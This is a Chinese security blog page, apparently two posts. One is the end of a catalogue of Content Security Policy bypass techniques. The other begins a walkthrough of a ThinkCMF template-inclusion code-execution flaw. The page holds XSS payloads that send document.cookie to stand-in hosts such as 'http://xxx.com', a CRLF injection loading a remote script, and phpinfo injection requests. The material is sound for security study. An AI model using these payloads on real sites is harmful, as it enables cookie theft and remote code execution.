<h4 id="CDN回调函数Bypass-CSP"><a href="#CDN回调函数Bypass-CSP" class="headerlink" title="CDN回调函数Bypass CSP"></a>CDN回调函数Bypass CSP</h4><p>在前端开发的时候会调用许多前端的框架和库，而为了减少服务器上面的压力或者减少占用资源等，有时会引入其他cdn上的js框架，当cdn上存在一些低版本的框架，即有可能存在绕过csp的风险</p>
<p>比如 <a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a></p>
<p>hackme的CSP引用cloudflare.com CDN服务，于是这篇文章的作者Orange师傅（tql)采取引用低版本的angular js模板注入来绕过CSP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K5FiWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K5FiWR.md.png" alt="K5FiWR.md.png"></a></p>
<p>evoA师傅中博客列出出来的<a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76（存在低版本angular" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76（存在低版本angular</a> js的cdn服务商列表）</p>
<h4 id="通过加载js库Bypass-CSP"><a href="#通过加载js库Bypass-CSP" class="headerlink" title="通过加载js库Bypass CSP"></a>通过加载js库Bypass CSP</h4><p>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>RCTF2018的 AMP库，通过如下payload获得名字为flag的cookie</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>常被用来绕过CSP的js库：</p>
<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<h4 id="url跳转Bypass-CSP"><a href="#url跳转Bypass-CSP" class="headerlink" title="url跳转Bypass CSP"></a>url跳转Bypass CSP</h4><p>在script-src允许unsafe-inline的情况下，CSP如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<p>可以通过window.location,document.location,location.href进行跳转Bypas</p>
<p>(img-src不限制的情况下)同时还可以通过img标签的src属性打xss</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">i.src = <span class="string">'http://xxx.com'</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>从decade师傅那里看到有一个Bypass <code>.</code>的操作，学习了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'img'</span>);</span><br><span class="line">i[<span class="string">'src'</span>] = <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](http:<span class="comment">//xxx.com 所对应的 Ascii 码，用逗号分隔) + document['cookie'];</span></span><br><span class="line"><span class="built_in">document</span>[<span class="string">'body'</span>][<span class="string">'appendChild'</span>](i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>同理iframe a audio等标签的src也都可以使用</p>
<h4 id="通过CRLF-Bypass-CSP"><a href="#通过CRLF-Bypass-CSP" class="headerlink" title="通过CRLF Bypass CSP"></a>通过CRLF Bypass CSP</h4><p><a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
<p>两个有意思的点</p>
<ul>
<li>首先是在Firefox浏览器下端口小于80则不会跳转</li>
<li>hearder下面两个%0a%0d将CSP内容挤到响应的下方，直接导致CSP无效</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;youvps&#x2F;cookie.js%3E%3C&#x2F;script%3E</span><br><span class="line">####</span><br></pre></td></tr></table></figure>

<h4 id="SVG-Bypass-CSP"><a href="#SVG-Bypass-CSP" class="headerlink" title="SVG Bypass CSP"></a>SVG Bypass CSP</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问svg文件即可触发xss</p>
<p>详见  <a href="https://xz.aliyun.com/t/4492" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492</a></p>
<h4 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h4><p><a href="https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area" target="_blank" rel="noopener">https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area</a></p>
<h4 id="通过CSS选择器获取内容"><a href="#通过CSS选择器获取内容" class="headerlink" title="通过CSS选择器获取内容"></a>通过CSS选择器获取内容</h4><p>测试代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; style-src 'unsafe-inline';img-src *"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;problem&#x2F;css.php?xss&#x3D;&lt;style&gt;input[value^&#x3D;&quot;t&quot;] &#123;background-image:url(&quot;http:&#x2F;&#x2F;attack&#x2F;?t&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KIeQGF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/31/KIeQGF.md.png" alt="KIeQGF.md.png"></a></p>
<p>需要Style可以内敛，img可以不同源，可新建标签。</p>
<h3 id="CSP的进化以及Bypass"><a href="#CSP的进化以及Bypass" class="headerlink" title="CSP的进化以及Bypass"></a>CSP的进化以及Bypass</h3><p>Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p>
<h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p>
<p>这个的Bypass前面加举了几个例子，只不过条件是特殊的…应该也不能算Bypass，emm之前的css在合适的条件下也可以Bypass</p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a> 利用浏览器缓存Bypass CSP script nonce</p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure>

<p>SD意味着可信js生成的js代码是可信的。</p>
<p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p>
<p>strict-dynamic结合gadget绕过CSP</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>写一些和本文无关的话题，19年，终于遇到了这么可爱的她了233，虽然相距很远吧，但我觉得应该还是有机会的，在2019年的这个年末，我一定会更加努力，去变得优秀一些，希望最终可以和宁在一起吧，宁真的好可爱啊！</p>
<h3 id="后后记"><a href="#后后记" class="headerlink" title="后后记"></a>后后记</h3><p>PS：（11.17 更新）我莫得感情 🙂</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP" target="_blank" rel="noopener">https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP</a></p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a></p>
<p><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/#利用DOM-XSS" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/#%E5%88%A9%E7%94%A8DOM-XSS</a></p>
<p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a></p>
<p><a href="https://xz.aliyun.com/t/318#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/318#toc-5</a></p>
<p><a href="https://evoa.me/index.php/archives/53/#toc-CSS选择器获取内容" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/#toc-CSS%E9%80%89%E6%8B%A9%E5%99%A8%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9</a></p>
<p>[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<p><a href="https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#通过目录绕过，引入一个AngularJS" target="_blank" rel="noopener">https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#%E9%80%9A%E8%BF%87%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87%EF%BC%8C%E5%BC%95%E5%85%A5%E4%B8%80%E4%B8%AAAngularJS</a></p>
<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/31/CSP-CSP-Bypass/" data-id="ckabsu37v000kkkvr0ppjgvzc" class="article-share-link" data-share="baidu" data-title="CSP &amp; CSP-Bypass">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/31/CSP-CSP-Bypass/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ThinkCMF任意内容包含漏洞复现分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-27T08:44:50.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">ThinkCMF任意内容包含漏洞复现分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="ThinkCMF简介"><a href="#ThinkCMF简介" class="headerlink" title="ThinkCMF简介"></a>ThinkCMF简介</h3><p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。<br>ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>ThinkCMF X1.6.0</p>
<p>ThinkCMF X2.1.0</p>
<p>ThinkCMF X2.2.0</p>
<p>ThinkCMF X2.2.1</p>
<p>ThinkCMF X2.2.2</p>
<p>ThinkCMF X2.2.3</p>
<p>本次漏洞分析所用的ThinkCMF版本为ThinkCMF X2.2.2</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>或者直接用display执行自定义Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;display&amp;templateFile&#x3D;README.md&amp;content&#x3D;&lt;?php phpinfo();die();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0wlZT.png" alt="K0wlZT.png"></p>
<h4 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0w6Wd.png" alt="K0w6Wd.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="Payload1分析"><a href="#Payload1分析" class="headerlink" title="Payload1分析"></a>Payload1分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>首先了解一下ThinkPHP的框架规则，通过g\m\a参数指定分组\模块\方法，比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line"><span class="comment">//首页 小夏是老猫除外最帅的男人了</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($what)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $what;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2019/10/26/K0fNNR.png" alt="K0fNNR.png"></p>
<p>Index控制器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//首页 小夏是老猫除外最帅的男人了</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首页用的是Index控制器，我们可以通过a方法调用父类中属性为public的函数，一共有三个满足这样条件的函数.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> display()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> fetch()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> parseTemplaye()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要能利用的是display方法和fetch方法。</p>
<p><strong>跟进父类HomebaseController中的display方法</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时$templateFile为readme.md</p>
<p><strong>跟进parseTemplate</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTemplate</span><span class="params">($template=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(is_file($template)) &#123;   </span><br><span class="line"><span class="keyword">return</span> $template;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过parseTemplate最终返回readme.md</p>
<p>跟进Controller.class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进Think\View-&gt;display</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    G(<span class="string">'viewStartTime'</span>);</span><br><span class="line">    <span class="comment">// 视图开始标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_begin'</span>,$templateFile);</span><br><span class="line">    <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">    $content = <span class="keyword">$this</span>-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">    <span class="comment">// 输出模板内容</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($content,$charset,$contentType);</span><br><span class="line">    <span class="comment">// 视图结束标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过fetch拿到$content内容，最终render渲染输出。</p>
<h4 id="Payload2分析"><a href="#Payload2分析" class="headerlink" title="Payload2分析"></a>Payload2分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>这个漏洞的主要问题就是在于fetch这个点，display函数在后来调用的也是fetch</p>
<p>这个payload分析的具体了一些，也算是补足display的在fetch中的详细内容吧，看网上的分析基本比较粗略吧，自己试着深入的分析了一下。最开始被缓存坑了…运行过一遍…第二次直接定位到缓存那去了…</p>
<h5 id="第一次运行的分析"><a href="#第一次运行的分析" class="headerlink" title="第一次运行的分析"></a>第一次运行的分析</h5><p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>
<p>第一次是没有缓存文件的，其实和我第二次分析的也差不多，只不过因为我是第二次所以进入的是if,没有进入else中的fetch函数。</p>
<h5 id="第二次运行的分析"><a href="#第二次运行的分析" class="headerlink" title="第二次运行的分析"></a>第二次运行的分析</h5><p><strong>HomebaseController.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    $templateFile = <span class="keyword">empty</span>($content)?<span class="keyword">$this</span>-&gt;parseTemplate($templateFile):<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进Controller.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进View.class.php中fetch方法中listen</strong></p>
